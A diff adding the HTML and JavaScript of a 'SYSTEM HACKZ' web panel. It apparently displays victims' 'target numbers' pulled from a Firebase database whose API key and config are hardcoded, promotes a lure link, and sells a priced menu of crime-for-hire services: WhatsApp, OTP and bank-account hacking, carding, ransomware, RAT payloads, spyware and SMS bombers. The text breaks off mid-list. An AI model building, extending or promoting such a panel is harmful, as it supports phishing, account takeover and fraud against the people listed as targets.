@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>My app</title>
+<style>
+:root {
+  --theme: #00ff66;
+  --theme-dim: rgba(0,255,102,0.3);
+}
+body{
+  margin:0;
+  background:#000;
+  color:#00ff66;
+  font-family:monospace;
+  padding:20px;
+  padding-top: 80px;
+  transition: color 0.6s ease;
+}
+.top{display:flex;gap:8px;margin-bottom:20px;}
+.code{
+  flex:1;border:1px solid #00ff66;padding:10px;overflow:hidden;
+  background:#111;border-radius:5px;font-size:14px;
+  display:flex;align-items:center;justify-content:center;
+  transition: border-color 0.6s ease;
+}
+#link{animation:colorChange 4s infinite;font-weight:bold;}
+@keyframes colorChange{
+  0%{color:#00ff66;}14%{color:#ff0000;}28%{color:#ffff00;}
+  42%{color:#ff00ff;}56%{color:#00ffff;}70%{color:#0000ff;}
+  84%{color:#ff9900;}100%{color:#00ff66;}
+}
+button{
+  background:#000;color:#00ff66;border:1px solid #00ff66;
+  padding:10px 15px;border-radius:5px;cursor:pointer;
+  font-size:14px;font-weight:bold;
+  transition: all 0.3s ease;
+}
+button:hover{background:#00ff66;color:#000;}
+.data-box{
+  border:1px solid #00ff66;border-radius:5px;margin:10px 0;
+  padding:15px;background:#111;
+  transition: border-color 0.6s ease;
+}
+.target-head{
+  display:flex;justify-content:space-between;align-items:center;
+  margin-bottom:10px;padding-bottom:5px;border-bottom:1px solid #00ff66;
+}
+.num{font-size:22px;font-weight:bold;color:#00ff66;letter-spacing:1px;transition:color 0.6s ease;}
+.time{color:#ff2b2b;font-size:14px;font-weight:bold;}
+.info-row{display:flex;margin:5px 0;font-size:14px;}
+.info-label{width:80px;color:#88ff88;font-weight:bold;}
+.info-value{flex:1;color:#fff;}
+.copy-btn{
+  margin-top:10px;background:#222;color:#00ff66;border:1px solid #00ff66;
+  padding:8px;border-radius:3px;cursor:pointer;font-size:12px;
+  width:100%;font-weight:bold;transition: all 0.3s ease;
+}
+.copy-btn:hover{background:#00ff66;color:#000;}
+.footer{
+  text-align:center;margin-top:30px;font-size:12px;color:#666;
+}
+canvas{position:fixed;top:0;left:0;z-index:-1;}
+h3{
+  border-bottom:1px solid #00ff66;padding-bottom:10px;text-align:center;
+  font-size:22px;margin:20px 0;color:#00ff66;transition:all 0.6s ease;
+}
+.hacker-popup{
+  position:fixed;top:50%;right:20px;transform:translateY(-50%);
+  background:rgba(0,20,0,0.98);border:1px solid #00ff66;
+  padding:8px 12px;border-radius:5px;z-index:9999;display:none;
+  flex-direction:column;justify-content:center;align-items:center;
+  animation:hackerSlide 0.4s ease-out;
+  box-shadow:0 0 20px #00ff66,0 0 40px rgba(0, 255, 102, 0.3);
+  min-width:160px;max-width:180px;backdrop-filter:blur(5px);
+  border-left:3px solid #ff0000;border-right:3px solid #ff0000;
+  transition: all 0.6s ease;
+}
+.hacker-text{
+  font-size:13px;font-weight:bold;color:#00ff66;text-shadow:0 0 5px #00ff66;
+  letter-spacing:0.5px;font-family:'Courier New',monospace;text-align:center;
+  padding:5px 8px;background:rgba(0,40,0,0.5);margin:2px;width:100%;
+  border-radius:3px;border:1px solid rgba(0, 255, 102, 0.3);
+}
+.hacker-subtext{
+  font-size:9px;color:#ff0000;text-shadow:0 0 3px #ff0000;
+  font-family:monospace;margin-top:2px;text-align:center;
+  font-weight:bold;letter-spacing:0.3px;
+}
+@keyframes hackerSlide{
+  0%{opacity:0;transform:translateY(-50%) translateX(50px);}
+  100%{opacity:1;transform:translateY(-50%) translateX(0);}
+}
+.hidden-audio-control{
+  position:absolute !important;width:0 !important;height:0 !important;
+  opacity:0 !important;pointer-events:none !important;
+  visibility:hidden !important;z-index:-9999 !important;
+}
+
+/* ============ 3-DOT MENU BUTTON (Scroll पर छिपेगा) ============ */
+.menu-btn{
+  position:fixed;top:15px;right:15px;width:48px;height:48px;
+  background:#111;border:1.5px solid #00ff66;border-radius:8px;
+  display:flex;flex-direction:column;justify-content:center;align-items:center;
+  gap:5px;cursor:pointer;z-index:10050;
+  box-shadow:0 0 12px rgba(0,255,102,0.5);
+  transition: all 0.45s cubic-bezier(0.4,0,0.2,1);
+  opacity:1;
+  transform: translateY(0);
+}
+.menu-btn:hover{background:#00ff66;box-shadow:0 0 20px #00ff66;}
+.menu-btn:hover .dot{background:#000;}
+.dot{width:6px;height:6px;background:#00ff66;border-radius:50%;transition:all 0.3s ease;}
+
+/* Scroll नीचे जाने पर बटन छिपेगा */
+.menu-btn.hidden-btn{
+  opacity:0;
+  pointer-events:none;
+  transform: translateY(-80px);
+}
+
+.side-menu{
+  position:fixed;top:0;right:-100%;width:88%;max-width:420px;height:100vh;
+  background:#0a0a0a;border-left:1.5px solid #00ff66;z-index:10060;
+  overflow-y:auto;transition:right 0.4s ease, border-color 0.6s ease;
+  box-shadow:-8px 0 40px rgba(0,255,102,0.3);
+}
+.side-menu.open{right:0;}
+.side-menu::-webkit-scrollbar{width:5px;}
+.side-menu::-webkit-scrollbar-track{background:#111;}
+.side-menu::-webkit-scrollbar-thumb{background:#00ff66;border-radius:3px;transition:background 0.6s ease;}
+.menu-header{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:15px 16px;border-bottom:1px solid #00ff66;
+  position:sticky;top:0;background:#0a0a0a;z-index:2;
+  transition:border-color 0.6s ease;
+}
+.menu-title{
+  font-size:14px;font-weight:bold;color:#00ff66;letter-spacing:1px;
+  text-shadow:0 0 8px #00ff66;transition:all 0.6s ease;
+}
+.close-btn{
+  width:32px;height:32px;background:#111;border:1px solid #ff2b2b;
+  color:#ff2b2b;border-radius:5px;font-size:16px;font-weight:bold;
+  cursor:pointer;transition:all 0.3s;
+}
+.close-btn:hover{background:#ff2b2b;color:#000;}
+.premium-banner{
+  margin:14px;padding:14px;border-radius:8px;
+  background:linear-gradient(135deg,#1a0033,#330066);
+  border:1.5px solid #ffcc00;box-shadow:0 0 18px rgba(255,204,0,0.35);
+  text-align:center;
+}
+.premium-badge{
+  display:inline-block;background:#ffcc00;color:#000;font-size:10px;
+  font-weight:bold;padding:3px 10px;border-radius:20px;margin-bottom:8px;
+  letter-spacing:1px;
+}
+.premium-title{font-size:15px;font-weight:bold;color:#fff;margin-bottom:6px;}
+.premium-desc{font-size:11px;color:#ddd;line-height:1.5;margin-bottom:10px;}
+.buy-btn{
+  width:100%;padding:11px;background:linear-gradient(90deg,#ffcc00,#ff9900);
+  color:#000;border:none;border-radius:6px;font-size:12px;font-weight:bold;
+  letter-spacing:1px;cursor:pointer;transition:all 0.3s;
+}
+.buy-btn:hover{background:#ffcc00;box-shadow:0 0 15px #ffcc00;}
+.tools-title{
+  margin:14px 14px 10px;padding:12px 8px;text-align:center;
+  font-size:12px;font-weight:bold;letter-spacing:1px;border-radius:6px;
+  background:#111;border:1px solid #ff9900;color:#fff;
+  text-shadow:0 0 8px #ff9900;
+}
+
+/* ============ TOOL ITEM ============ */
+.tool-item{
+  display:flex;align-items:center;justify-content:center;
+  margin:8px 14px;padding:14px 12px;border-radius:8px;
+  background:linear-gradient(135deg, #0a0a0a 0%, #111 50%, #0a0a0a 100%);
+  border:1.5px solid rgba(255,255,255,0.15);
+  font-size:14px;font-weight:900;
+  cursor:pointer;transition:all 0.3s ease;
+  letter-spacing:0.5px;
+  position:relative;overflow:hidden;
+  font-family:'Segoe UI', system-ui, sans-serif;
+  text-align:center;
+}
+.tool-item .tool-name{
+  background-image: linear-gradient(
+    90deg,
+    #00ff66, #00d4ff, #cc44ff, #ff2b2b, #ffcc00, #00ff66,
+    #00d4ff, #cc44ff, #ff2b2b, #ffcc00, #00ff66
+  );
+  background-size: 400% 100%;
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+  animation: rainbowFlow 4s linear infinite;
+  display:inline-block;
+  padding:2px 6px;
+  letter-spacing:0.8px;
+  filter: drop-shadow(0 0 6px currentColor) drop-shadow(0 0 12px rgba(255,255,255,0.4));
+  will-change: background-position, filter;
+}
+@keyframes rainbowFlow{
+  0%   { background-position: 0% 50%; }
+  100% { background-position: 400% 50%; }
+}
+.tool-item:nth-child(5n+1) .tool-name { animation-duration: 3s; }
+.tool-item:nth-child(5n+2) .tool-name { animation-duration: 4s; }
+.tool-item:nth-child(5n+3) .tool-name { animation-duration: 3.5s; }
+.tool-item:nth-child(5n+4) .tool-name { animation-duration: 4.5s; }
+.tool-item:nth-child(5n+5) .tool-name { animation-duration: 5s; }
+.tool-item:hover{
+  transform:translateX(4px) scale(1.02);
+  background:linear-gradient(135deg, #0a1a0a 0%, #1a1a1a 50%, #0a1a0a 100%);
+  border-color:#00ff66;
+  box-shadow:0 0 22px rgba(0,255,102,0.55), inset 0 0 15px rgba(0,255,102,0.1);
+}
+.tool-item:hover .tool-name{
+  animation-duration: 1.5s;
+  filter: drop-shadow(0 0 10px currentColor) drop-shadow(0 0 22px #fff);
+}
+.tool-item::before{
+  content:"";
+  position:absolute;
+  top:0;left:-100%;
+  width:100%;height:100%;
+  background:linear-gradient(90deg, transparent, rgba(255,255,255,0.18), transparent);
+  animation: shine 3s linear infinite;
+  pointer-events:none;
+}
+.tool-item:nth-child(3n+2)::before { animation-duration: 3.5s; }
+.tool-item:nth-child(3n+3)::before { animation-duration: 4s; }
+@keyframes shine{
+  0%   { left: -100%; }
+  100% { left: 100%; }
+}
+.tool-item:active{ transform: scale(0.97); }
+
+.overlay{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.7);z-index:10055;opacity:0;
+  pointer-events:none;transition:opacity 0.3s;
+}
+.overlay.show{opacity:1;pointer-events:all;}
+
+.buy-modal{
+  position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.85);
+  width:88%;max-width:380px;background:#0a0a0a;
+  border:2px solid #ffcc00;border-radius:12px;
+  padding:22px 18px;z-index:10070;opacity:0;pointer-events:none;
+  transition:all 0.35s cubic-bezier(0.4,0,0.2,1);
+  box-shadow:0 0 40px rgba(255,204,0,0.5),inset 0 0 30px rgba(255,204,0,0.05);
+  text-align:center;
+}
+.buy-modal.show{opacity:1;pointer-events:all;transform:translate(-50%,-50%) scale(1);}
+.buy-modal-badge{
+  display:inline-block;background:linear-gradient(90deg,#ffcc00,#ff9900);
+  color:#000;font-size:10px;font-weight:900;padding:4px 12px;
+  border-radius:20px;letter-spacing:1.5px;margin-bottom:12px;
+  box-shadow:0 2px 10px rgba(255,204,0,0.5);
+}
+.buy-modal-tool{
+  font-size:14px;font-weight:900;color:#00ff66;margin-bottom:10px;
+  padding:10px 8px;background:#111;border-radius:8px;
+  border:1px solid #00ff66;letter-spacing:0.5px;line-height:1.4;
+  text-shadow:0 0 8px rgba(0,255,102,0.4);
+}
+.buy-modal-price{
+  font-size:32px;font-weight:900;color:#ffcc00;margin:14px 0;
+  text-shadow:0 0 15px #ffcc00;letter-spacing:2px;
+}
+.buy-modal-price small{
+  display:block;font-size:11px;color:#888;font-weight:normal;
+  letter-spacing:1px;margin-top:4px;text-shadow:none;
+}
+.buy-modal-msg{
+  font-size:12.5px;color:#fff;line-height:1.6;margin:14px 0 18px;
+  padding:12px 10px;background:rgba(255,204,0,0.08);
+  border-radius:8px;border:1px dashed rgba(255,204,0,0.4);
+}
+.buy-modal-msg b{color:#ffcc00;}
+.buy-modal-actions{display:flex;gap:8px;flex-direction:column;}
+.buy-modal-buy{
+  width:100%;padding:13px;
+  background:linear-gradient(90deg,#ffcc00,#ff9900);
+  color:#000;border:none;border-radius:8px;
+  font-size:13px;font-weight:900;letter-spacing:1.5px;
+  cursor:pointer;transition:all 0.3s;
+  box-shadow:0 4px 15px rgba(255,204,0,0.4);
+}
+.buy-modal-buy:hover{transform:translateY(-2px);box-shadow:0 6px 22px rgba(255,204,0,0.7);}
+.buy-modal-close{
+  width:100%;padding:10px;background:#111;color:#888;
+  border:1px solid #333;border-radius:8px;font-size:12px;
+  font-weight:bold;cursor:pointer;transition:all 0.3s;
+  letter-spacing:1px;
+}
+.buy-modal-close:hover{background:#1a1a1a;color:#fff;border-color:#555;}
+
+/* ============ 🌈 THEME COLOR CYCLING ============ */
+body,
+button,
+h3,
+.num,
+.copy-btn,
+.menu-title,
+.menu-btn,
+.dot,
+.code,
+.data-box,
+.target-head,
+.side-menu,
+.menu-header {
+  transition: color 0.8s ease, border-color 0.8s ease, background 0.8s ease, box-shadow 0.8s ease;
+}
+body { color: var(--theme); }
+button { color: var(--theme); border-color: var(--theme); }
+button:hover { background: var(--theme); }
+h3 { color: var(--theme); border-bottom-color: var(--theme); }
+.num { color: var(--theme); }
+.copy-btn { color: var(--theme); border-color: var(--theme); }
+.copy-btn:hover { background: var(--theme); }
+.code { border-color: var(--theme); }
+.data-box { border-color: var(--theme); }
+.target-head { border-bottom-color: var(--theme); }
+.menu-btn { border-color: var(--theme); box-shadow: 0 0 12px var(--theme-dim); }
+.dot { background: var(--theme); }
+.menu-btn:hover { background: var(--theme); box-shadow: 0 0 20px var(--theme); }
+.menu-title { color: var(--theme); text-shadow: 0 0 8px var(--theme); }
+.menu-header { border-bottom-color: var(--theme); }
+.side-menu { border-left-color: var(--theme); box-shadow: -8px 0 40px var(--theme-dim); }
+.side-menu::-webkit-scrollbar-thumb { background: var(--theme); }
+.footer b { color: var(--theme); }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<audio id="backgroundSong" class="hidden-audio-control" loop autoplay>
+  <source src="https://assets.mixkit.co/music/preview/mixkit-horror-spooky-strings-550.mp3" type="audio/mpeg">
+  <source src="https://assets.mixkit.co/music/preview/mixkit-dark-ambient-86.mp3" type="audio/mpeg">
+</audio>
+<audio id="horrorSound" class="hidden-audio-control" loop>
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-horror-sound-there-is-someone-here-2484.mp3" type="audio/mpeg">
+</audio>
+<audio id="clickSound" preload="auto">
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-modern-technology-select-3124.mp3" type="audio/mpeg">
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-ui-click-1093.mp3" type="audio/mpeg">
+</audio>
+
+<div class="menu-btn" id="menuBtn" onclick="openMenu()">
+  <div class="dot"></div>
+  <div class="dot"></div>
+  <div class="dot"></div>
+</div>
+
+<div class="overlay" id="overlay" onclick="closeMenu()"></div>
+
+<div class="side-menu" id="sideMenu">
+  <div class="menu-header">
+    <div class="menu-title">⚡ MENU</div>
+    <button class="close-btn" onclick="closeMenu()">✕</button>
+  </div>
+
+  <div class="premium-banner">
+    <span class="premium-badge">👑 PREMIUM</span>
+    <div class="premium-title">🔓 Unlock All Tools</div>
+    <div class="premium-desc">सभी प्रीमियम खरीदने के लिए<br>OWNERS से संपर्क करें</div>
+    <button class="buy-btn" onclick="showBuyInfo('PREMIUM BUNDLE','₹4,999')">💰 BUY PREMIUM</button>
+  </div>
+
+  <div class="tools-title">🚀 PREMIUM – BUY NOW 🚀</div>
+
+  <div id="toolsList"></div>
+</div>
+
+<div class="buy-modal" id="buyModal">
+  <span class="buy-modal-badge">🔒 PREMIUM TOOL</span>
+  <div class="buy-modal-tool" id="buyToolName">Tool Name</div>
+  <div class="buy-modal-price" id="buyToolPrice">₹0<small>ONE TIME PRICE</small></div>
+  <div class="buy-modal-msg">
+    👉 यह प्रीमियम टूल है।<br>
+    <b>खरीदने के लिए ओनर से संपर्क करें।</b><br>
+    <span style="color:#888;font-size:11px">Pay & get instant access</span>
+  </div>
+  <div class="buy-modal-actions">
+    <button class="buy-modal-buy" onclick="confirmBuy()">💬 I WANT TO BUY</button>
+    <button class="buy-modal-close" onclick="closeBuyModal()">CANCEL</button>
+  </div>
+</div>
+
+<div id="hackerPopup" class="hacker-popup">
+  <div class="hacker-text">✩𖤍𝗦𝗬𝗦𝗧𝗘𝗠 𝗛𝗔𝗖𝗞𝗭𖤍✩</div>
+  <div class="hacker-subtext">𓅓𓅓𓅓𓅓𓅓𓅓𓅓𓅓𓅓𓅓</div>
+</div>
+
+<div class="top">
+  <div class="code" id="link">https://free-belance.onrender.com</div>
+  <button onclick="copyLink()">COPY NOW</button>
+</div>
+
+<h3>🎯 TARGET NUMBERS DETAILS</h3>
+<div id="list"></div>
+
+<div class="footer">💀 Developer: <b>dassu</b> | <b style="color:#ffcc00">SYSTEM HACKZ</b> 💀</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDh-VVcK_5W-vP-4cCxFTzM7Eq0a47O6qc",
+  authDomain: "all-cuntrol.firebasestorage.app",
+  databaseURL: "https://all-cuntrol-default-rtdb.firebaseio.com",
+  projectId: "all-cuntrol",
+  storageBucket: "all-cuntrol.firebasestorage.app",
+  messagingSenderId: "980086452552",
+  appId: "1:980086452552:web:0173d97b95f874f9f1437d"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+/* ============ 🌈 THEME CYCLING ============ */
+const themeColors = [
+  { main: '#00ff66', dim: 'rgba(0,255,102,0.3)' },
+  { main: '#ff2b2b', dim: 'rgba(255,43,43,0.3)' },
+  { main: '#ffcc00', dim: 'rgba(255,204,0,0.3)' },
+  { main: '#ff44aa', dim: 'rgba(255,68,170,0.3)' }
+];
+let themeIndex = 0;
+function applyTheme() {
+  const c = themeColors[themeIndex];
+  document.documentElement.style.setProperty('--theme', c.main);
+  document.documentElement.style.setProperty('--theme-dim', c.dim);
+  themeIndex = (themeIndex + 1) % themeColors.length;
+}
+applyTheme();
+setInterval(applyTheme, 5000);
+
+/* ============ 📜 SCROLL पर MENU BUTTON छिपाना/दिखाना ============ */
+(function() {
+  const menuBtn = document.getElementById('menuBtn');
+  let lastScrollY = window.scrollY;
+
+  function handleScroll() {
+    const currentScrollY = window.scrollY;
+
+    // अगर menu खुला है तो कुछ न करें
+    const menuOpen = document.getElementById('sideMenu').classList.contains('open');
+    if (menuOpen) return;
+
+    // Top पर पहुँच गए (50px से कम) तो बटन दिखाओ
+    if (currentScrollY < 50) {
+      menuBtn.classList.remove('hidden-btn');
+    }
+    // नीचे स्क्रॉल कर रहे हैं तो बटन छिपाओ
+    else if (currentScrollY > lastScrollY) {
+      menuBtn.classList.add('hidden-btn');
+    }
+    // ऊपर स्क्रॉल कर रहे हैं तो बटन दिखाओ
+    else if (currentScrollY < lastScrollY) {
+      menuBtn.classList.remove('hidden-btn');
+    }
+
+    lastScrollY = currentScrollY;
+  }
+
+  window.addEventListener('scroll', handleScroll, { passive: true });
+})();
+
+/* ============ 🔊 CLICK SOUND ============ */
+function playClickSound() {
+  try {
+    const clickAudio = document.getElementById('clickSound');
+    if (clickAudio) {
+      clickAudio.currentTime = 0;
+      clickAudio.volume = 0.6;
+      clickAudio.play().catch(()=>{});
+    }
+  } catch(e){}
+}
+document.addEventListener('click', function(e) { playClickSound(); }, true);
+document.addEventListener('touchstart', function(e) { playClickSound(); }, true);
+
+/* ============ TOOLS LIST ============ */
+const toolsList = [
+  {name:"🔓 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🍪 𝐂𝐨𝐨𝐤𝐢𝐞 𝐇𝐢𝐣𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹999"},
+  {name:"📱 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🔐 𝐖𝐢𝐅𝐢 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,299"},
+  {name:"📡 𝐖𝐢𝐅𝐢 𝐉𝐚𝐦𝐦𝐞𝐫", price:"₹1,999"},
+  {name:"💣 𝐁𝐨𝐦𝐛𝐞𝐫 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹799"},
+  {name:"🖥️ 𝐏𝐚𝐧𝐞𝐥 + 𝐇𝐚𝐜𝐤 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹4,999"},
+  {name:"📸 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,799"},
+  {name:"🛠️ 𝐌𝐨𝐝𝐝𝐢𝐧𝐠 & 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,299"},
+  {name:"🔑 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🏦 𝐁𝐚𝐧𝐤 𝐈𝐧𝐟𝐨 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,999"},
+  {name:"🚫 𝐀𝐥𝐥 𝐁𝐚𝐧𝐧𝐢𝐧𝐠 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"📊 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,299"},
+  {name:"🦠 𝐕𝐢𝐫𝐮𝐬 & 𝐑𝐚𝐧𝐬𝐨𝐦𝐰𝐚𝐫𝐞 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🐀 𝐑𝐀𝐓𝐬 𝐏𝐚𝐲𝐥𝐨𝐚𝐝 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"📹 𝐂𝐂𝐓𝐕 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"💻 𝐒𝐨𝐟𝐭𝐰𝐚𝐫𝐞 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹999"},
+  {name:"📩 𝐎𝐓𝐏 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🌐 𝐅𝐫𝐞𝐞 𝐍𝐞𝐭 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹799"},
+  {name:"🐞 𝐁𝐮𝐠 𝐁𝐨𝐮𝐧𝐭𝐲 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🐧 𝐋𝐢𝐧𝐮𝐱 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🕵️ 𝐒𝐩𝐲𝐰𝐚𝐫𝐞 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🎣 𝐏𝐡𝐢𝐬𝐡𝐢𝐧𝐠 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,299"},
+  {name:"🖼️ 𝐏𝐡𝐨𝐭𝐨𝐬 𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐬 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🧠 𝐒𝐨𝐜𝐢𝐚𝐥 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫𝐢𝐧𝐠 𝐒𝐤𝐢𝐥𝐥𝐬", price:"₹999"},
+  {name:"🤖 𝐀𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐨𝐧 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"📵 𝐅𝐚𝐤𝐞 𝐍𝐮𝐦𝐛𝐞𝐫 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹699"},
+  {name:"💬 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐂𝐡𝐚𝐭 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"⌨️ 𝐂𝐨𝐝𝐢𝐧𝐠 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"💳 𝐂𝐚𝐫𝐝𝐢𝐧𝐠 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹4,499"},
+  {name:"📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🔄 𝐁𝐲𝐩𝐚𝐬𝐬𝐢𝐧𝐠 𝐌𝐞𝐭𝐡𝐨𝐝𝐬", price:"₹1,299"},
+  {name:"📲 𝐀𝐩𝐩 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🏧 𝐁𝐚𝐧𝐤 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹4,999"},
+  {name:"📦 𝐀𝐩𝐩 𝐇𝐚𝐜𝐤 𝐌𝐚𝐤𝐢𝐧𝐠 (𝐑𝐞𝐚𝐥)", price:"₹3,499"},
+  {name:"📡 𝐒𝐈𝐌 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"💎 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐀𝐩𝐩𝐬", price:"₹1,999"},
+  {name:"📞 𝐍𝐮𝐦𝐛𝐞𝐫 𝐈𝐧𝐟𝐨 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,299"},
+  {name:"🐛 𝐁𝐮𝐠 𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐬 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"📶 𝐇𝐨𝐭𝐬𝐩𝐨𝐭 𝐏𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🥷 𝐀𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬 𝐇𝐢𝐝𝐞 𝐌𝐚𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"📱 𝐓𝐞𝐫𝐦𝐮𝐱 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹999"},
+  {name:"🐧 𝐊𝐚𝐥𝐢 𝐋𝐢𝐧𝐮𝐱 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,799"},
+  {name:"🖥️ 𝐏𝐚𝐫𝐫𝐨𝐭 𝐎𝐒 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,799"},
+  {name:"🔍 𝐑𝐞𝐜𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🌐 𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"📡 𝐒𝐮𝐛𝐝𝐨𝐦𝐚𝐢𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,299"},
+  {name:"🔎 𝐏𝐨𝐫𝐭 𝐒𝐜𝐚𝐧𝐧𝐢𝐧𝐠 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹999"},
+  {name:"🛡️ 𝐅𝐢𝐫𝐞𝐰𝐚𝐥𝐥 𝐁𝐲𝐩𝐚𝐬𝐬 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📲 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐑𝐀𝐓 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,499"},
+  {name:"🍎 𝐢𝐎𝐒 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹4,999"},
+  {name:"💻 𝐖𝐢𝐧𝐝𝐨𝐰𝐬 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🐧 𝐌𝐢𝐜 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,999"},
+  {name:"☁️ 𝐂𝐥𝐨𝐮𝐝 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"🔗 𝐀𝐏𝐈 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🗄️ 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,499"},
+  {name:"🕸️ 𝐖𝐞𝐛 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"📧 𝐄𝐦𝐚𝐢𝐥 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🔑 𝐊𝐞𝐲𝐥𝐨𝐠𝐠𝐞𝐫 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"🎭 𝐈𝐝𝐞𝐧𝐭𝐢𝐭𝐲 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"💀 𝐄𝐱𝐩𝐥𝐨𝐢𝐭 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"🧬 𝐌𝐚𝐥𝐰𝐚𝐫𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📸 𝐂𝐚𝐦𝐞𝐫𝐚 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"🎤 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
